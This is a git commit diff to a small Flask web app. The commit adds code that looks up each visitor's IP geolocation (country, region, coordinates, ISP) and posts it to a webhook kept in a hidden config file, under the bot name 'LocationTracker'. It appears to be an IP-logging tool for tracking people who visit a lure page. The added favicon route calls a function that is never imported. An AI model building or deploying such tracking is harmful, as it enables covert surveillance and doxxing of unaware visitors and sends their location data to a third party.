53dd404c6ae93079946ad2310406f1ec49a9e325
r-dark-skull <r-dark-skull@outlook.com>
2023-03-22 16:29:17 +0000

    hook init

--- app.py
+++ app.py
@@ -1,11 +1,34 @@
 from flask import Flask, request
 import requests
+import json
 
 app = Flask(__name__)
 
+cfg = json.loads(open('.cfg').read())
+
+dwebHook = cfg['dwebHook']
+
 def get_geolocation(ip):
     resp = requests.get(f'http://ip-api.com/json/{ip}')
-    print(resp)
+    js = json.loads(resp.content)
+
+    payload = ''
+    payload += f"*IP Address*  : `{js['query']}` \n"
+    payload += f"*County*      : `{js['country']}`\n"
+    payload += f"*Region*      : `{js['regionName']}`\n"
+    payload += f"*Latitude*    : `{js['lat']}`\n"
+    payload += f"*Longitude*   : `{js['lon']}`\n"
+    payload += f"*ISP*         : `{js['isp']}`\n"
+
+    content = {
+        "content" : payload,
+        "username" : "LocationTracker-Shamen-Vilkern",
+        "avatar_url": "https://w0.peakpx.com/wallpaper/189/241/HD-wallpaper-handsome-asta-demon-king.jpg"
+    }
+
+    res = requests.post(url = dwebHook, json = content)
+    print("[+] Request admitted")
+
 
 @app.route("/")
 def homepage():
@@ -16,11 +39,14 @@ def homepage():
 def js_script():
     return open("./static/script.js").read()
 
+@app.route("/favicon.ico")
+def favicon():
+    return send_from_directory('./static', 'favicon.ico')
+
 @app.route("/name=<params>")
 def name(params):
-    print(request.remote_addr, params)
     return "<h1>Page home </h1>"
 
 
 if __name__ == '__main__':
-    app.run(debug=True, port=8000, host='0.0.0.0')
+    app.run(debug=False, port=8005, host='0.0.0.0')
